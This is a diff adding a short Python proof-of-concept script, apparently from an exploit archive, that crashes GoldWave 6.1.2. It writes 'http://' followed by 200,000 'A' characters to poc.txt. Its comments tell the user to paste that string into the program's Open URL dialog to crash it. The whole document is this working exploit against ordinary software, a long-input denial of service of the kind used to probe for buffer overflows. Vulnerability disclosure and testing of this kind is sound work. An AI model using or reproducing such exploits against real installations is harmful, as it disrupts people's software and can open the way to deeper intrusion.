@@ -1,0 +1,24 @@
+#!/usr/bin/python
+# Exploit Title: GoldWave 6.1.2 (URL) Local Crash Exploit
+# Date: 12-06-2015
+# Exploit Author: 0neb1n
+# Vendor Homepage: http://www.goldwave.com/
+# Software Link: http://goldwave.com/downloads/InstallGoldWave612.exe
+# Version: 6.1.2
+# Tested on: Windows 8.1 Home KR
+# Step 1 : Make poc.txt and copy "http://AAAAAAAA..."
+# Step 2 : run GoldWave 6.1.2 -> File -> Open URl -> Paste "http://AAAAAA..."
+# step 3 : Boom!!
+
+file = "poc.txt"
+
+data = 'http://' + '\x41' * 200000
+
+fd = open(file, 'w')
+fd.write(data)
+fd.close()
+
+print ""
+print "[*] File successfully created !!"
+print "[*] Author : 0neb1n"
+print "[*] Mail : barcodecrow(at)gmail(dot)com"
